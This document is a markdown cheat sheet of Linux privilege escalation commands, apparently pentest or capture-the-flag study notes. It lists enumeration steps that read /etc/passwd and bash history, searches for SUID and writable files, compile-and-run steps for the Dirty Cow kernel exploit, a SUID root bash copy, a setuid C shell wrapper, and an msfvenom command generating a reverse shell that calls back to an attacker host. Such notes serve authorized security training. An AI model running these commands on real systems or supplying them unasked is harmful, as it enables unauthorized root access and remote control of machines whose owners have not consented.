# Linux Privilege Escalation Commands

This document contains various commands and techniques for Linux privilege
escalation, organized by function.

---

## 1. Information Gathering

### User Information

```bash
# Current user and permissions
id
whoami
sudo -l  # List commands user can run with sudo

# All system users
cat /etc/passwd
```

### System Information

```bash
# Hostname
hostname

# OS details
cat /etc/issue
cat /etc/*-release
uname -a  # Kernel version (important for kernel exploits)

# Process listing
ps aux

# Bash history
cat ~/.bash_history

# Package information
dpkg -l
```

### Network Information

```bash
# Network interfaces
ip a
ifconfig a

# Routing information
route
routel

# Open ports and active connections
netstat -anp
ss -anp
netstat -tulpn
```

### Firewall Configuration

```bash
# Find firewall rules
grep -Hs iptables /etc/*

# If found, examine configuration
cat /etc/backup_iptables
```

### Storage Information

```bash
# Mount points
mount
cat /etc/fstab
lsblk
```

### Kernel Modules

```bash
# List loaded modules
lsmod

# Module details
/sbin/modinfo <module_name>
```

---

## 2. Finding Vulnerabilities

### SUID Binaries

```bash
# Find SUID executables (potential privilege escalation)
find / -perm -u=s -type f 2>/dev/null
```

### Writable Files & Directories

```bash
# Find writable directories
find / -writable -type d 2>/dev/null

# Find writable files
find / -writable -type f 2>/dev/null

# Exclude /proc directory from results
find / -writable -type f 2>/dev/null | grep -v "\/proc\/"
```

### Scheduled Tasks

```bash
# Check cron jobs
ls -lah /etc/cron*
cat /etc/crontab
```

### Process Monitoring

```bash
# Monitor process execution in real-time
./pspy
```

---

## 3. Privilege Escalation Techniques

### Kernel Exploits

```bash
# Check kernel version for vulnerabilities
uname -a

# Search for matching exploits
searchsploit linux kernel 2.6 priv esc
```

### Dirty Cow Exploit

Dirty Cow (CVE-2016-5195) is a famous Linux kernel vulnerability

```bash
# Compile the exploit
gcc -pthread c0w.c -o c0w

# Run the exploit
./c0w
```

[Reference code](https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54)

---

## 4. Spawning Privileged Shells

### SUID Bash Method

```bash
# Copy bash to a writable location
cp /bin/bash /tmp/bash

# Set SUID bit and change ownership
chmod +s /tmp/bash
chown root:root /tmp/bash

# Execute with privilege preservation
/tmp/bash -p
```

### Custom C Executable

```c
// Create a C file (main.cpp)
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile the code
gcc -o shell main.cpp
```

### Msfvenom Payload

```bash
# Generate a reverse shell ELF executable
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### More Shell Options

For more reverse shell options,
visit [revshells.com](https://www.revshells.com/)

---

## 5. Additional Resources

### Automated Tools

-
LinPEAS - [github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
-
LinEnum - [github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
-
pspy - [github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
- GTFOBins - [gtfobins.github.io](https://gtfobins.github.io/)
